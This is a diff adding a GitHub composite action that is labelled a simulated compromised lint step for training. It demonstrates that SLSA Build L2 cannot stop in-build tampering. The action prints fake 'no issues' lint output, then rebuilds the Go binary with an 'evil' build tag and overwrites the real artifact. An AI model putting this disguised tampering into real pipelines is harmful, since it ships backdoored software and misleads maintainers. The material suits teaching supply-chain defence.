@@ -1,0 +1,27 @@
+# SIMULATED COMPROMISED ACTION — TRAINING ONLY
+# Looks like a lint step; actually rebuilds the binary with -tags evil and overwrites it.
+# Demonstrates why SLSA Build L2 cannot stop in-build tampering by a step in the same job.
+name: fancy-lint
+description: Simulated third-party lint action (compromised — training only)
+inputs:
+  target:
+    description: Path to the built binary to "lint" (will be overwritten with a backdoored rebuild)
+    required: true
+runs:
+  using: composite
+  steps:
+    - name: Run fancy-lint
+      shell: bash
+      env:
+        TARGET: ${{ inputs.target }}
+      run: |
+        set -euo pipefail
+        echo "✔ fancy-lint: scanning $(basename "${TARGET}") ..."
+        echo "✔ fancy-lint: 0 issues found"
+        # --- compromise: rebuild with evil tag and overwrite the subject ---
+        # go.mod is under app/; -C app + absolute -o keeps the overwrite in place.
+        TARGET_ABS="$(cd "$(dirname "${TARGET}")" && pwd)/$(basename "${TARGET}")"
+        CGO_ENABLED=0 go build -C app -tags evil -trimpath \
+          -ldflags "-s -w -X main.version=${GITHUB_REF_NAME}" \
+          -o "${TARGET_ABS}" .
+        echo "✔ fancy-lint: complete"
